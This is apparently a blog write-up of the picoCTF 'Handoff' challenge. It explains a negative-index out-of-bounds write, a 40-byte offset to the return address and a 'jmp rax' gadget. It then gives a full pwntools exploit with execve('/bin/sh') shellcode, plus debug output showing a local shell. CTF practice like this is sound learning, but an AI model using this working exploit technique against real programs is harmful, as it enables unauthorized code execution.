---
title: "Handoff"
date: "2025-12-17"
tags: ["picoCTF", "OOB", "ret2reg", "shellcode"]
---

In this exercise they give us a binary and its source code:

```c
./handoff
What option would you like to do?
1. Add a new recipient
2. Send a message to a recipient
3. Exit the app
3
Thank you for using this service! If you could take a second to write a quick review, we would really appreciate it:
hola
```

It looks like a messaging program where we can add contacts and send messages. Let's look at the code:

```c
#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>

#define MAX_ENTRIES 10
#define NAME_LEN 32
#define MSG_LEN 64

typedef struct entry {
	char name[8];
	char msg[64];
} entry_t;

void print_menu() {
	puts("What option would you like to do?");
	puts("1. Add a new recipient");
	puts("2. Send a message to a recipient");
	puts("3. Exit the app");
}

int vuln() {
	char feedback[8];
	entry_t entries[10];
	int total_entries = 0;
	int choice = -1;
	// Have a menu that allows the user to write whatever they want to a set buffer elsewhere in memory
	while (true) {
		print_menu();
		if (scanf("%d", &choice) != 1) exit(0);
		getchar(); // Remove trailing \n

		// Add entry
		if (choice == 1) {
			choice = -1;
			// Check for max entries
			if (total_entries >= MAX_ENTRIES) {
				puts("Max recipients reached!");
				continue;
			}

			// Add a new entry
			puts("What's the new recipient's name: ");
			fflush(stdin);
			fgets(entries[total_entries].name, NAME_LEN, stdin);
			total_entries++;
			
		}
		// Add message
		else if (choice == 2) {
			choice = -1;
			puts("Which recipient would you like to send a message to?");
			if (scanf("%d", &choice) != 1) exit(0);
			getchar();

			if (choice >= total_entries) {
				puts("Invalid entry number");
				continue;
			}

			puts("What message would you like to send them?");
			fgets(entries[choice].msg, MSG_LEN, stdin);
		}
		else if (choice == 3) {
			choice = -1;
			puts("Thank you for using this service! If you could take a second to write a quick review, we would really appreciate it: ");
			fgets(feedback, NAME_LEN, stdin);
			feedback[7] = '\0';
			break;
		}
		else {
			choice = -1;
			puts("Invalid option");
		}
	}
}

int main() {
	setvbuf(stdout, NULL, _IONBF, 0);  // No buffering (immediate output)
	vuln();
	return 0;
}

```

Right, now we understand how the program works. We can see it is written in a strange way and that there are sizes that are not consistent:

```c
#define MAX_ENTRIES 10
#define NAME_LEN 32
#define MSG_LEN 64

typedef struct entry {
	char name[8];
	char msg[64];
} entry_t;


char feedback[8];
fgets(feedback, NAME_LEN, stdin);
```

There are already several overflows there that we can use to try to reach the return address and go for a **ret2shellcode**. The problem is we have no stack leak. Even so we could work around that with a ret2reg if the conditions are right. If we keep looking we can find the most interesting bug:

```c
		else if (choice == 2) {
			choice = -1;
			puts("Which recipient would you like to send a message to?");
			if (scanf("%d", &choice) != 1) exit(0);
			getchar();

			if (choice >= total_entries) { // Aquí
				puts("Invalid entry number");
				continue;
			}

			puts("What message would you like to send them?");
			fgets(entries[choice].msg, MSG_LEN, stdin);
		}
```

As we can see there is a check for an invalid contact number. But it only blocks the cases where we go past the index, not the negative ones. So if we put `-1` or any smaller number, the `msg` field can overwrite the return address. This OOB is much more valuable than the feedback one, for example, because there is a lot of room in msg since it is 64 bytes.

Let's test if msg reaches the return address and if it leaves enough room for a shellcode:

```c
What option would you like to do?
1. Add a new recipient
2. Send a message to a recipient
3. Exit the app
2
Which recipient would you like to send a message to?
-1
What message would you like to send them?
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa

RSP  0x7fffffffdae8 ◂— 'faaaaaaagaaaaaaahaaaaaa'

cyclic -l faaaaaaa
Found at offset 40
```

Perfect! We have plenty of room for a shellcode and then the return address that jumps to it.

Here comes the last problem. We have no stack leak, so we do not know where our shellcode lands because of ASLR. But here is something interesting:

```c
fgets(entries[choice].msg, MSG_LEN, stdin);
```

The function the program uses to take our payload is fgets. fgets leaves the address of our input in RAX, and...

```
pwndbg> rop
...
0x0040116c : jmp rax
```

It all fits! Let's write the exploit:

```c
exe = './handoff'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'debug'

shellcode = asm('\n'.join([

    'mov rbx, %d' % u64(b'/bin/sh\0'),
    'push rbx',
    'mov rdi, rsp',
    'xor rsi, rsi',
    'xor rdx, rdx',
    'mov rax, 59',
    'syscall'
]))

padding = 40

jmp_rax = p64(0x000000000040116c)

info(f'Longitud shellcode: {len(shellcode)}')

io = start()

io.recvline(b'app\n')
io.sendline(b'2')
io.sendlineafter(b'to?\n', b'-1')

io.recvline(b'them?\n')
io.sendline(shellcode.ljust(padding, b'\x00') + jmp_rax)
```

```c
python3 solve.py
[DEBUG] Received 0x6a bytes:
    b'What option would you like to do?\n'
    b'1. Add a new recipient\n'
    b'2. Send a message to a recipient\n'
    b'3. Exit the app\n'
[DEBUG] Sent 0x2 bytes:
    b'2\n'
[DEBUG] Received 0x35 bytes:
    b'Which recipient would you like to send a message to?\n'
[DEBUG] Sent 0x3 bytes:
    b'-1\n'
[DEBUG] Received 0x2a bytes:
    b'What message would you like to send them?\n'
[DEBUG] Sent 0x31 bytes:
    00000000  48 bb 2f 62  69 6e 2f 73  68 00 53 48  89 e7 48 31  │H·/b│in/s│h·SH│··H1│
    00000010  f6 48 31 d2  48 c7 c0 3b  00 00 00 0f  05 00 00 00  │·H1·│H··;│····│····│
    00000020  00 00 00 00  00 00 00 00  6c 11 40 00  00 00 00 00  │····│····│l·@·│····│
    00000030  0a                                                  │·│
    00000031
[*] Switching to interactive mode
$ whoami
[DEBUG] Sent 0x7 bytes:
    b'whoami\n'
[DEBUG] Received 0x7 bytes:
    b'ub1cu0\n'
ub1cu0
$ ls
[DEBUG] Sent 0x3 bytes:
    b'ls\n'
[DEBUG] Received 0x2e bytes:
    b'handoff  handoff.c  handoff_patched  solve.py\n'
handoff  handoff.c  handoff_patched  solve.py
```

It works! Thanks for reading.
